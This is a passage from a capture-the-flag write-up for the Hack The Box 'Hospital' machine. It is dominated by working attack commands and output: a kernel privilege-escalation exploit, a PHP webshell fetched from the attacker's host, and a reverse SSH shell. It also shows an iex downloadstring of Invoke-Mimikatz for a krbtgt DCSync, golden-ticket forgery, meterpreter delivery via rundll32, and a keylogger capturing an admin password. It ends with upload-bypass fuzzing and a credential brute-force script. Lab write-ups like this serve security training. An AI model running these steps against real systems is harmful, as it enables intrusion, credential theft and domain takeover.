www-data@webserver:/tmp/CVE-2023-35001$ ./exploit
[+] Using config: 5.19.0-35-generic
[+] Recovering module base
[+] Module base: 0xffffffffc06d9000
[+] Recovering kernel base
[+] Kernel base: 0xffffffff91200000
[+] Got root !!!

# id
uid=0(root) gid=0(root) groups=0(root)
```

## Privilege escalation on host via webshell


### NT Authority SYSTEM

We can write webshells to go for the path of **Service Account -> Abuse Privilege token**

![](/assets/obsidian/407c4fe52a9ac89dbe5ce9857f1f487f.png)

For php webshell to work on windows, we need line breaks

> `shell.php`

```php
<?php

system($_REQUEST[0]);

?>
```

```ruby
wget 10.10.16.30/shell.php -O C:\xampp\htdocs\layout.php
```

For some reasons, `apache` was running as system

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ curl -k -X POST "https://hospital.htb/layout.php" --data "0=whoami"
nt authority\system

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ curl -k -X POST "https://hospital.htb/layout.php" --data "0=type C:\Users\Administrator\Desktop\root.txt"
df4f54e48ca3010fd1ec3cb63c07ea8a
```

### From SYSTEM to Domain Admin


#### Get a Shell

Start my reverse ssh client as NT Authority SYSTEM

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ curl -k -X POST "https://hospital.htb/layout.php" --data '0=C:\Programdata\ssh.exe -d 10.10.16.30:22521'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ ssh -J 127.0.0.1:22521 nt.authority.system.dc
```


#### Dump krbtgt's hash

Since we're on DC, we can get `krbtgt`'s hash

```bash
PS C:\Users\Administrator\Documents> iex (new-object net.webclient).downloadstring("http://10.10.16.30/pwsh/Invoke-Mimikatz.ps1");
PS C:\Users\Administrator\Documents> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate /domainadmin" "lsadump::dcsync /user:krbtgt"'
```

![](/assets/obsidian/d7d4866ea8da50bbd5a8ac620dfed5fc.png)

#### Golden Ticket

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ ticketer.py -aesKey 0fa78db0cef2cc7a56c8b9657743c55f87037982e25beab9dcdd7a6d09789fad -domain-sid S-1-5-21-4208260710-2273545631-1523135639 -domain hospital.htb Administrator
Impacket v0.12.0.dev1+20231108.130828.33058eb - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for hospital.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

#### Evil-Winrm - Pass The Ticket

Configure `/etc/krb5.conf` for **evil-winrm**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ python ~/scripts/ad/configure_krb5.py hospital.htb dc
[*] This script must be run as root
[*] Configuration Data:
[libdefault]
        default_realm = HOSPITAL.HTB

[realms]
        HOSPITAL.HTB = {
                kdc = dc.hospital.htb
                admin_server = dc.hospital.htb
        }

[domain_realm]
        hospital.htb = HOSPITAL.HTB
        .hospital.htb = HOSPITAL.HTB


[!] Above Configuration will overwrite /etc/krb5.conf, are you sure? [y/N] y
[+] /etc/krb5.conf has been configured
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ export KRB5CCNAME=Administrator.ccache

┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ evil-winrm -r hospital.htb -i dc.hospital.htb

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hospital.htb\administrator
```

## From drbrown to Administrator (RDP and keylogging)


### RDP

> If there's **RDP** opened on a machine, just RDP in and see what happens
{: .prompt-tip }

There was a person entering Administrator's credentials in IE (in this case it was a browser automation bot)

![](/assets/obsidian/1749537b9c1a4b7c5db03d787fda6de6.gif)

Just change the properties of password field (Or click on `Reveal Password`) to reveal it

![](/assets/obsidian/b353a7f6bd0a9bc34ac0ca8f2b75f41f.png)

or just let it input in a place that shows clear text

![](/assets/obsidian/7d833d48bb395c0db1e229756a5df9d1.png)

### What if this is a real situation?

What if there was really a human typing the credentials to login web mail?

We can't control his mouse and keyboard since it will alert him our intrusion,

So there are mainly two ways to get the creds:
1. Keylogger on OS
2. Insert Javascript keylogger to web application

Since we cannot modify any source codes, use keylogger on OS instead

#### Keylogging with metasploit

Using **metasploit** just for POC, there are better choices

Deliver the `meterpreter` DLL to target

```ruby
msf6 > use exploit/windows/smb/smb_delivery
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_delivery) > setg lhost tun0
lhost => tun0
msf6 exploit(windows/smb/smb_delivery) > setg SRVHOST tun0
SRVHOST => tun0
msf6 exploit(windows/smb/smb_delivery) > exploit
[*] Exploit running as background job 4.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/smb_delivery) >
[*] Started reverse TCP handler on 10.10.16.30:4444
[*] Server is running. Listening on 10.10.16.30:445
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.16.30\WwKXm\test.dll,0
```

Load DLL on target

```bash
PS C:\Users\drbrown.HOSPITAL\Documents> rundll32.exe \\10.10.16.30\WwKXm\test.dll,0
```

Load keylogger module

```ruby
[*] Sending stage (175686 bytes) to 10.129.229.189
[*] Meterpreter session 3 opened (10.10.16.30:4444 -> 10.129.229.189:12107) at 2023-12-07 16:29:52 +0800

msf6 exploit(windows/smb/smb_delivery) > use windows/capture/keylog_recorder
msf6 post(windows/capture/keylog_recorder) > options

Module options (post/windows/capture/keylog_recorder):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CAPTURE_TYPE  explorer         no        Capture keystrokes for Explorer, Winlogon or PID (Accepted: explorer, winlogon, pid)
   INTERVAL      5                no        Time interval to save keystrokes in seconds
   LOCKSCREEN    false            no        Lock system screen.
   MIGRATE       false            no        Perform Migration.
   PID                            no        Process ID to migrate to
   SESSION       2                yes       The session to run this module on
```

Set `MIGRATE` to true to let it migrate to `explorer.exe` (defined at `CAPTURE_TYPE`), so it can capture keys at user desktop level

```ruby
msf6 post(windows/capture/keylog_recorder) > set MIGRATE true
MIGRATE => true
msf6 post(windows/capture/keylog_recorder) > exploit -jz
[*] Post module running as background job 6.
msf6 post(windows/capture/keylog_recorder) >
[*] Executing module against DC
[*] Trying explorer.exe (6648)
[+] Already in Explorer.EXE (6648) as: HOSPITAL\drbrown
[*] Starting the keylog recorder...
[*] Keystrokes being saved in to /home/kali/.msf4/loot/20231207163341_default_10.129.229.189_host.windows.key_156983.txt
[*] Recording keystrokes...
```

Now we can monitor what the user typed

Fun fact : Metasploit's `keylog_recorder` didn't capture `SHIFT` keypress at the start, so `!` became `1`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ tail -f /home/kali/.msf4/loot/20231207163341_default_10.129.229.189_host.windows.key_156983.txt
...
Ad
minis
trat
or
th
3b3st
H0sp
1t4l
9786
1
ad
mini
stra
tor
Th
3B3s
tH0s
p1t4
l9786
!
```

## File Upload Bypass tool

> https://github.com/sAjibuu/Upload_Bypass

This tool tests all bypass methods on **hacktricks**

- Replace the file content with the string `*content*` 
- Replace filename.ext with the string `*filename*` as below

![](/assets/obsidian/9cc705fd04b7b15b0ed3f80ea5dfb9b5.png)

Before running the tool, we'll have to do some tweaks

```bash
cd /opt/sectools/web/Bypasses/Upload_Bypass


# Flollow all redirections
find lib/ -type f -exec sed -i 's/allow_redirects=False/allow_redirects=True/g' {} +


# Don't base64 encode file content
find lib/ -type f -exec sed -i 's/file_data_new = base64.b64encode(file_data_new)//g' {} +


# Replace webshell source to phpinfo
echo '<?php phpinfo(); ?>' > assets/webshell.php
```

Now start the script

```bash
python upload_bypass.py -b /home/kali/htb/Hospital/upload.req -s 'been successfully uploaded' -e php -a "jpg" --continue --proxy http://127.0.0.1:8080
```

Parse successful result persistently

```bash
while true; do cat hospital.htb:8080/Results.txt|grep 'File uploaded successfully'|sed 's/File uploaded successfully with Extension: //g' > success.txt; sleep 1; done
```

Fuzz the success files to check for large size (Indicates `phpinfo()` success)

```bash
ffuf -c --request-proto http -u "http://hospital.htb:8080/uploads/FUZZ" -w success.txt -fs 25,279
```

Result : Only `.phar` files succeed

![](/assets/obsidian/41643e72e5b148050a6617b14c4d9c3f.png)

Reset the repo after all

```bash
cd /opt/sectools/web/Bypasses/ && rm -rf Upload_Bypass && 7z x Upload_Bypass_v2.0.9-offical.zip
```


## Webshells that bypasses `disable_function`

> https://github.com/flozz/p0wny-shell

> https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php

## Credential Brute Forcing

> Files with `.lst` are validated ones, `.txt` are gathered data
{: .prompt-tip }

These are the collected creds

```bash
┌──(bravosec㉿fsociety)-[~/htb/Hospital]
└─$ cat creds.lst
root:my$qls3rv1c3!
admin:123456
patient:patient
drwilliams:qwe123!@#
```

Write a script to brute force all known entries that requires credentials

> `brute.sh`

```bash

#!/bin/bash


# Wordlist
cat creds.lst | cut -d ":" -f 2 > passwords.lst
cat creds.lst | cut -d ":" -f 1 > users.lst
hashcat --force --stdout passwords.lst -r /usr/share/hashcat/rules/best64.rule > passwords_b64.lst


# AD

## Gathered credentials
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst -bP passwords_b64.lst kerberos -d hospital.htb

## Username as password
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst --user-as-password kerberos -d hospital.htb

## Null passwords
/opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst -bp '' kerberos -d hospital.htb


# SMB (Local)
cme smb hospital.htb -u users.lst -p passwords.lst --local-auth


# Web
```